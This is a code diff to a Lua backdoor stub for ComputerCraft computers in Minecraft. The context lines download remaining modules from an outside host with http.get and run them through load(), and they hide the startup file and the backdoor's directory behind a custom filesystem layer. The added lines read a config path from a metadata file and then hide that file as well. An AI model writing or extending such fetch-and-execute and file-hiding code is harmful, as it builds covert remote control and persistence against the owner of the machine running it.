@@ -27,6 +27,7 @@ local EnD = (pcall(require, "sys.crypto.EnD") and require("sys.crypto.EnD")) or 
 local command_handler = (pcall(require, "networking.processor.command_handler") and require("networking.processor.command_handler")) or load(http.get("https://mydevbox.cc/src/networking/processor/command_handler.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "command_handler", "t", _G)()
 local uninstaller_installer = (pcall(require, "uninstaller") and require("uninstaller")) or load(http.get("https://mydevbox.cc/src/uninstaller.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "uninstaller", "t", _G)()
 
+local configpath = nil
 local metadataFile = nil
 local rstartup = utils.generateRandomString(3)
 _OGFS.copy("startup.lua",rstartup)
@@ -108,6 +109,13 @@ local bdapath, filename = getBDApath()
 metadataFile=getMetadataFile()
 _OGFS.delete(rstartup)
 
+local function getConfigUrl()
+    --metadataFile
+    if ((_OGFS.exists(metadataFile)) and (utils.getFileSize(metadataFile) > 0)) then
+        configpath = utils.getMetadataValue(_OGFS, metadataFile, "config", "|")
+    end
+end
+
 local function hideStartup()
     if xsup ~= nil then
         local handle = _OGFS.open(xsup, "r")
@@ -137,7 +145,9 @@ if xsup~=nil then
     customfs.setOriginalStartup(xsup)
     customfs.hideFile(xsup)
 end
-
+if metadataFile~=nil then
+    customfs.hideFile(metadataFile)
+end
 if customfs ~= nil and bdapath ~= nil then
     filename = nil
     customfs.hideDir(bdapath)
